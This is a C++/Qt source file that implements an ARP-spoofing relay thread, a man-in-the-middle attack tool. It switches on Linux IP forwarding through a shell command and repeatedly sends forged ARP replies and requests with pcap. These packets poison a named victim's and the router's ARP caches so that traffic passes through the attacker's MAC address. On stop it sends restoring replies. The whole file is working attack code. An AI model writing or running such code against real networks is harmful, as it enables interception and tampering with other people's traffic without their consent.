#include "relay_falsify.h"
#include <QCoreApplication>
#include <QHostAddress>

void request_packet();
void reply_packet();

QString relay_len, relay_atk_mac, relay_router_ip, relay_router_mac, relay_victim_ip, relay_victim_mac;
u_char *relay_packet, falsifyAtkMac[6] = {0,}, falsifyRouterMac[6] = {0,}, falsifyVictimMac[6] = {0,};
pcap_t *relay_pcap;
bool stop_flag;

u_char bc_f[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
u_char bc_0[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

relay_falsify::relay_falsify(QObject *parent) : QThread(parent) {
	stop_flag = this->falsifyStop = true;
}

void relay_falsify::run() {
	QTime time_relay;
	char buf[10] = {0,};
	time_relay.start();
	if(relay_len.toInt() > 42) {
		int size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
		relay_packet += size;
		for(int i = 0; i < relay_len.toInt() - size; i++) *(relay_packet + i) = 0x00;
		relay_packet -= size;
	}
	popen_used("if [ -f \"/proc/sys/net/ipv4/ip_forward\" ]; then echo 1 > /proc/sys/net/ipv4/ip_forward; echo success; else echo failed; fi;", buf, sizeof(buf));
	if(!strncasecmp(buf, "success", 7)) {
		while(this->falsifyStop) {
			if(((time_relay.elapsed() / 1000) % 5) == 0) reply_packet();
			if(((time_relay.elapsed() / 1000) % 2) == 0) request_packet();
			usleep(50000);
		}
		stop_flag = this->falsifyStop;
		for(int i = 0; i < 3; i++) {
			sleep(1);
			reply_packet();
		}
		system("echo 0 > /proc/sys/net/ipv4/ip_forward");
	}
	else {
		qDebug() << "IP_FORWARDING ERROR!!";
	}
}

void reply_packet() {
	struct libnet_arp_hdr *arph;
	arph = (struct libnet_arp_hdr*)(relay_packet + sizeof(struct libnet_ethernet_hdr));

	pre_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
	if(stop_flag) pre_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN, "upper");
	else pre_filter(relay_router_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN, "upper");

	relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);

	*(relay_packet + 1) = ARPOP_REPLY;
	if(stop_flag) pre_filter(relay_atk_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
	else pre_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
	pre_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN, "lower");

	relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);

	pre_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "lower");
	pre_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN, "lower");

	relay_packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dha) - sizeof(arph->ar_dpa);

	pcap_sendpacket(relay_pcap, relay_packet, relay_len.toInt());
//	printf("////////////////// This is reply ///////////////////");
//	print_packet(relay_len.toInt(), pack);
}

void request_packet() {
	int i = 0, cnt = 0;
	struct libnet_arp_hdr *arph;
	arph = (struct libnet_arp_hdr*)(relay_packet + sizeof(struct libnet_ethernet_hdr));

	pre_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN, "upper");
	pre_filter(relay_atk_mac.toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha), ETHER_ADDR_LEN, "upper");
	pre_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa), IP_ADDR_LEN, "lower");
	pre_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa), IP_ADDR_LEN, "lower");

	if(!(cnt % 2)) {
		for(i = 0; i < ETHER_ADDR_LEN; i++) *(relay_packet + i) = *(bc_f + i);
		relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);
		*(relay_packet - 1) = ARPOP_REQUEST;
		relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);
		for(i = 0; i < ETHER_ADDR_LEN; i++) *(relay_packet + i) = *(bc_0 + i);
	}
	else {
		pre_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
		relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);
		*(relay_packet - 1) = ARPOP_REPLY;
		relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);
		pre_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
	}
	cnt++;

	relay_packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dha) - sizeof(arph->ar_dpa);

	pcap_sendpacket(relay_pcap, relay_packet, relay_len.toInt());
//	printf("////////////////// This is request ///////////////////");
//	print_packet(relay_len.toInt(), pack);
}

void relay_falsify::relayGetInfo(QString a, QString b, QString c, QString d, QString e, QString f, u_char *g, pcap_t *h) {
	relay_victim_ip = a;
	relay_victim_mac = b;
	relay_router_ip = c;
	relay_router_mac = d;
	relay_atk_mac = e;
	relay_len = f;
	relay_packet = g;
	relay_pcap = h;
}
